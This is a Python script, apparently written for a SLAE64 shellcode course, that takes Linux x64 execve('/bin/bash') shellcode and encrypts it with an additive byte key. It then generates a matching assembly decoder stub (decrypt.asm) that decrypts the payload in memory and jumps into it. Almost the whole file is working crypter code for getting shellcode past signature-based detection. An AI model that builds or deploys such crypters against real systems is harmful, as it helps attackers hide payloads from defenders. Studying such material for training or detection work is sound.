#!/usr/bin/python
# Filename: add-cryptor.py
# Author:   Bobby Cooke
# Blog:     https://boku7.github.io/2020/04/27/SLAE64_7-cryptor.html

# Execve(/bin/bash) Linux/x64 Shellcode
payload  = "\x48\x31\xf6"     # xor rsi, rsi
payload += "\x48\xf7\xe6"     # mul rsi       ; rdx&rax= 0x0
payload += "\x48\x31\xff"     # xor rdi, rdi
payload += "\x57"             # push rdi
payload += "\x48\x83\xc2\x68" # add rdx, 0x68 ; "h"
payload += "\x52"             # push rdx
payload += "\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" 
           # movabs rdx, 0x7361622f6e69622f ; "/bin/bas"
payload += "\x52"             # push rdx
payload += "\x48\x31\xd2"     # xor rdx, rdx
payload += "\x48\x89\xe7"     # mov rdi, rsp  ; rdi = Pointer -> "/bin/bash"0x00
payload += "\xb0\x3b"         # mov al, 0x3b  ; execve syscall number
payload += "\x0f\x05"         # syscall       ; call execve("/bin/bash", NULL, NULL)

key = "SoSecr3T"
encrypted = ""
keyArray = bytearray(key)
keyLength = len(key)

count1 = 0
count2 = 0

for x in bytearray(payload): 
    if count1 == keyLength:   # If key length is exceeded, reuse the key
        count1 = 0
    x += keyArray[count1]     # Add payload 1st byte and key together
    if x > 255:               # check for overflow
        x -= 256        
    if count2 == 0:
        encrypted += '0x'
        encrypted += '%02x' %x
    else:
        encrypted += ',0x'
        encrypted += '%02x' %x
    count1 += 1
    count2 += 1

encrypted += ',0xaa,0xbb'

print "[--------------Encrypted-Payload--------------]"
print "Encryped Payload Size is: "+ str(hex(len(payload)+2)) + " Bytes"
print encrypted

keyHex = ""
count  = 0
for x in keyArray:
    if count == 0:
        keyHex += '0x'
        keyHex += '%02x' %x
    else:
        keyHex += ',0x'
        keyHex += '%02x' %x
    count += 1

keyHex += ',0xee' # End of key byte

print "[----------------Key-Info---------------------]"
print "Key Size is: "+ str(keyLength) + " Bytes"
print keyHex


# Write Assembly Code to a File

asmFile  = 'xor rcx, rcx  ; rcx = 0x0\r\n'
asmFile += 'mul rcx       ; rax&rdx = 0x0\r\n'
asmFile += 'jmp short callEncrypted\r\n'
asmFile += 'popEncrypted:\r\n'
asmFile += 'pop rdi       ; rdi = &Encrypted\r\n'
asmFile += 'jmp short callKey\r\n'
asmFile += 'popKey:\r\n'
asmFile += 'pop rax       ; rax = &key\r\n'
asmFile += 'resetKey:\r\n'
asmFile += 'push rax\r\n'
asmFile += 'pop rsi       ; rsi = &key\r\n'
asmFile += 'decryptLoop:\r\n'
asmFile += 'mov dl, [rsi]\r\n'
asmFile += 'sub [rdi], dl    ; decrypt byte of payload\r\n'
asmFile += 'inc rsi          ; next key byte\r\n'
asmFile += 'inc rdi          ; next encrypted byte\r\n'
asmFile += 'mov dx, 0xbbaa\r\n'
asmFile += 'cmp [rdi], dx    ; End of payload?\r\n'
asmFile += 'je payload\r\n'
asmFile += 'mov dl, 0xee\r\n'
asmFile += 'cmp [rsi], dl    ; End of key?\r\n'
asmFile += 'je resetKey\r\n'
asmFile += 'jmp short decryptLoop ; use next byte of key to decrypt\r\n'
asmFile += 'callEncrypted:\r\n'
asmFile += 'call popEncrypted\r\n'
asmFile += 'payload:\r\n'
asmFile += 'db '+encrypted+'\r\n'
asmFile += 'callKey:\r\n'
asmFile += 'call popKey\r\n'
asmFile += 'key:\r\n'
asmFile += 'db '+keyHex+'\r\n'

File    = "decrypt.asm"
try:
    f       = open(File, 'w')
    f.write(asmFile)
    f.close()
    print File + " created successfully"
except:
    print File + ' failed to create'


